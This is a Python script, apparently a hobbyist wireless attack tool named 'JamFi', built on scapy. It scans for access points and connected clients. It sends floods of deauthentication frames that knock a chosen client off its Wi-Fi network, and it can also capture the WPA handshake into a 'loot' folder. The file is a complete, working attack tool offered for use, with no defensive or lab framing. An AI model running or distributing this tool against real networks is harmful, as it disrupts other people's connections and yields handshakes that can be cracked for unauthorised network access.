#!/usr/bin/env python3
import os
import sys
import time
import subprocess
from scapy.all import *
from threading import Thread

seen_aps = {}
clients = {}

# 🌸 JamFi Banner
def print_banner():
    print(r"""
     ██╗ █████╗ ███╗   ███╗        ███████╗██╗
     ██║██╔══██╗████╗ ████║        ██╔════╝██║
     ██║███████║██╔████╔██║        █████╗  ██║
██   ██║██╔══██║██║╚██╔╝██║        ██╔══╝  ██║
╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║     ██║
 ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝

         💜  JamFi Wi-Fi Chaos Tool  💜
      👩‍💻  Author: ekoms savior
      📡  Like Spam Jam — but wireless!
""")

# 📡 Channel Hopper
def channel_hopper(iface):
    while True:
        for ch in range(1, 14):
            os.system(f"iwconfig {iface} channel {ch}")
            time.sleep(0.5)

# 📶 Packet Handler for Client Scan
def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Elt].info.decode(errors='ignore')
        if bssid not in seen_aps:
            seen_aps[bssid] = ssid
            print(f"📶 AP: {ssid:<25} BSSID: {bssid}")

    if pkt.haslayer(Dot11):
        if pkt.type == 2:
            src = pkt.addr2
            dst = pkt.addr1
            bssid = pkt.addr3
            if bssid in seen_aps and src != bssid:
                if src not in clients:
                    clients[src] = bssid
                    print(f"💡 Client: {src} -> AP: {seen_aps[bssid]}")

# 🔍 Client Scanner
def scan_clients():
    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
    if not iface:
        print("⚠️ Interface not entered.")
        return

    print("📡 Scanning for clients and APs...\n")
    Thread(target=channel_hopper, args=(iface,), daemon=True).start()
    sniff(iface=iface, prn=packet_handler, store=0)

# 💾 EAPOL Handshake Sniffer
def capture_handshake(iface, target_bssid):
    os.makedirs("loot", exist_ok=True)
    file_path = f"loot/handshake_{target_bssid.replace(':', '')}.pcap"
    print(f"📡 Sniffing for EAPOL handshakes to {target_bssid}... Saving to {file_path}")

    def eapol_filter(pkt):
        return pkt.haslayer(EAPOL) and pkt.haslayer(Dot11) and pkt.addr2 == target_bssid

    packets = sniff(iface=iface, lfilter=eapol_filter, timeout=30)
    if packets:
        wrpcap(file_path, packets)
        print(f"✅ Handshake captured and saved to {file_path} 💾")
    else:
        print("⚠️ No handshake captured.")

# 💥 Deauth Attack (with toggle for handshake capture)
def deauth_attack():
    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
    target = input("💜 Target Client MAC Address (STA): ").strip()
    ap = input("💜 Access Point MAC Address (BSSID): ").strip()
    try:
        count = int(input("💜 Number of deauth packets to send (e.g. 1000): "))
        interval = float(input("💜 Time between packets (e.g. 0.05): "))
    except ValueError:
        print("⚠️ Invalid count or interval.")
        return

    mode = input("💜 Capture handshake too? (1 = just deauth, 2 = deauth + handshake): ").strip()

    if mode == "2":
        t = Thread(target=capture_handshake, args=(iface, ap))
        t.start()
        time.sleep(2)  # Give sniffer a head start

    dot11 = Dot11(addr1=target, addr2=ap, addr3=ap)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    print(f"\n🚀 Sending {count} deauth packets to {target} from {ap} via {iface}...\n")
    sendp(frame, iface=iface, count=count, inter=interval, verbose=1)
    print("✅ Deauth complete!\n")

# 🏁 Menu
def main():
    print_banner()
    while True:
        print("\n🔹 1️⃣  Scan Connected Clients 🔍")
        print("🔹 2️⃣  Deauth Attack 💥")
        print("🔹 3️⃣  Quit ❌")
        choice = input("💜 Choose an option (1-3): ").strip()

        if choice == "1":
            scan_clients()
        elif choice == "2":
            deauth_attack()
        elif choice == "3":
            print("👋 Goodbye, fren! Stay spicy! 💜")
            sys.exit()
        else:
            print("⚠️ Invalid choice. Try again!\n")

if __name__ == "__main__":
    main()
